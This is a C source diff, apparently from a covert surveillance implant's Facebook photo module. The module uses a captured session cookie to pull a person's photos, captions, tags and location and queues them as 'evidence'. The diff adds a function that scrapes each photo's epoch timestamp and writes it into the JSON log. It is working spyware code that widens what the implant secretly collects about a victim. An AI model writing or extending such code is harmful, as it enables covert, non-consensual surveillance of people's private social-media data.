@@ -23,6 +23,7 @@ extern BOOL bPM_PhotosStarted;
 #define FBID_PHOTO_TAG_LIST	"<span class=\"fbPhotoTagList\" id=\"fbPhotoPageTagList\">"
 #define FBID_PHOTO_TAG_ITEM "<span class=\"fbPhotoTagListTag tagItem\">"
 #define FBID_PHOTO_LOCATION "in <span class=\"fbPhotoTagListTag withTagItem tagItem\">"
+#define FBID_PHOTO_TIMESTAMP "fbPhotoPageTimestamp"
 
 // defining a 2nd time (HM_Photo.h)..
 typedef struct _PHOTO_ADDITIONAL_HEADER
@@ -1578,6 +1579,56 @@ LPSTR FacebookPhotoExtractPhotoLocation(__in LPSTR strCookie, __in LPSTR strHtml
 	return strLocation;
 }
 
+
+/*
+	Description:	extracts the epoch timestamp  from a Facebook photo specific page
+	Params:			Facebook photo specific page
+	Usage:			returns null or a string containing the epoch timestamp, which must be freed by the caller. Input page is modified temporary.
+					
+*/
+LPSTR FacebookPhotoExtractTimestamp(__in LPSTR strHtmlPage)
+{
+	/* allocations:
+		- strTimestamp is allocated and returned to the caller
+	*/
+
+	LPSTR strParser1, strParser2;
+	CHAR chTmp;
+	LPSTR strTimestamp = NULL;
+
+	strParser1 = strstr(strHtmlPage, FBID_PHOTO_TIMESTAMP);
+	if (!strParser1)
+		return NULL;
+	
+	strParser1 += strlen(FBID_PHOTO_TIMESTAMP);
+	strParser1 = strstr(strParser1, "data-utime=\"");
+	if (!strParser1)
+		return NULL;
+
+	strParser1 += strlen("data-utime=\"");
+
+	strParser2 = strstr(strParser1, "\"");
+	if (!strParser2)
+		return NULL;
+
+	/* temporary change input page */
+	chTmp = *strParser2;
+	*strParser2 = NULL;
+
+	size_t timestampLength = strlen(strParser1) + 1;
+	strTimestamp = (LPSTR) zalloc_s(timestampLength);
+	if (!strTimestamp)
+		return NULL;
+
+	strncpy_s(strTimestamp, timestampLength, strParser1, _TRUNCATE);
+
+	/* restore input page */
+	*strParser2 = chTmp;
+
+	return strTimestamp;
+}
+
+
 /*
 	Description:	append to strAppendMe a snprintf' of strFormat and strConsumed
 	Params:			string to be appended, format string with a %s (e.g. \"description\": \"%s\", ";), string sprintf'd into the format string
@@ -1613,13 +1664,14 @@ VOID FacebookPhotoLogJsonAppend(LPSTR* strAppendMe, __in LPCSTR strFormat, __in 
 		
 }
 
+
 /* 
 	Description:	prepare and queue a complete photo log (blob + metadata) for a single fbid
 	Params:			photo blob, its size, caption, tags, location, path 
 	Usage:			-
 					
 */
-VOID FacebookPhotoLog(__in LPBYTE lpPhotoBlob, __in ULONG uSize, __in LPSTR strCaption, __in LPSTR strTags, __in LPSTR strLocation, __in LPSTR strPhotoPath)
+VOID FacebookPhotoLog(__in LPBYTE lpPhotoBlob, __in ULONG uSize, __in LPSTR strCaption, __in LPSTR strTags, __in LPSTR strLocation, __in LPSTR strPhotoPath, __in LPSTR strTimestamp)
 {
 	/* allocations:
 		- strJsonLog contain the full json log and before queuing the evidence the null termination is removed, beware
@@ -1734,6 +1786,14 @@ VOID FacebookPhotoLog(__in LPBYTE lpPhotoBlob, __in ULONG uSize, __in LPSTR strC
 			}
 		}
 	}
+
+	// timestamp
+	if (strTimestamp)
+	{
+		LPCSTR strTimestampTemplate = "\"time\": %s, ";
+		FacebookPhotoLogJsonAppend(&strJsonLog, strTimestampTemplate, strTimestamp);
+	}
+
 	// close json
 
 
@@ -1824,8 +1884,11 @@ VOID FacebookPhotoHandleSinglePhoto(__in LPSTR strCookie,  facebook_photo_id *fb
 	/*	e] optional - location */
 	LPSTR strLocation = FacebookPhotoExtractPhotoLocation(strCookie, strRecvBuffer);
 
+	/*  f] optional - timestamp */
+	LPSTR strEpochTimestamp = FacebookPhotoExtractTimestamp(strRecvBuffer);
+
 	/* log all the things */
-	FacebookPhotoLog(strRecvPhoto, uSize, strCaption, strTags, strLocation, strPhotoBlobPath);
+	FacebookPhotoLog(strRecvPhoto, uSize, strCaption, strTags, strLocation, strPhotoBlobPath, strEpochTimestamp);
 
 	/* cleanup */
 	if (strRecvPhoto)
@@ -1843,6 +1906,9 @@ VOID FacebookPhotoHandleSinglePhoto(__in LPSTR strCookie,  facebook_photo_id *fb
 	if (strLocation)
 		zfree_s(strLocation);
 	
+	if (strEpochTimestamp)
+		zfree_s(strEpochTimestamp);
+
 	zfree_s(strRecvBuffer); 
 }
 
